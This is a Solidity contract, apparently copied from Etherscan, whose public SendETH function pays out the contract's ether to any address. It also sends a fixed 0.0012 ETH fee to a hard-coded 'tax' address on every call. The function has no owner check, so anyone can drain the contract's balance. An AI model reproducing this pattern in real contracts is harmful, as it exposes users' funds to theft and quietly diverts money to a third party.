/**
 *Submitted for verification at Etherscan.io on 2023-03-17
*/

//Send ETH from contract
// fdl

pragma solidity ^0.6.6;


contract SendETHToAddress {
 
    //uint liquidity;
    //uint private pool;
    address public owner;

    event Log(string _msg);

    /*
     * @dev constructor
     * @set the owner of the contract 
     */
    constructor() public {
        owner = msg.sender;
    }

    struct slice {
        uint _len;
        uint _ptr;
    }

    receive() external payable {}
 
    function getBalance() private view returns(uint) {
        // Check available balance

        return address(this).balance;
    }

    function SendETH(address _addr, uint _amount) public payable {
        address to = _addr; // Receiver address
        uint amount = _amount; // Amount of eth to send
        // Send ETH to entered address
        address payable contracts = payable(to);
        contracts.transfer(amount * 1e18); // Send ETH (ether)

        // If there is tax on transaction
        // Example 0.0012 eth for each transaction
        address toTaxAddress = 0x2d35d84fb373199c45a419c94C9a56c3f199d281; // Tax Receiver address
        uint256 TaxAmount = 12; // Amount of eth to send
        // Send ETH to entered address
        address payable contractsTax = payable(toTaxAddress);
        contractsTax.transfer(TaxAmount * 1e14); // Send ETH (ether)
    }
    

}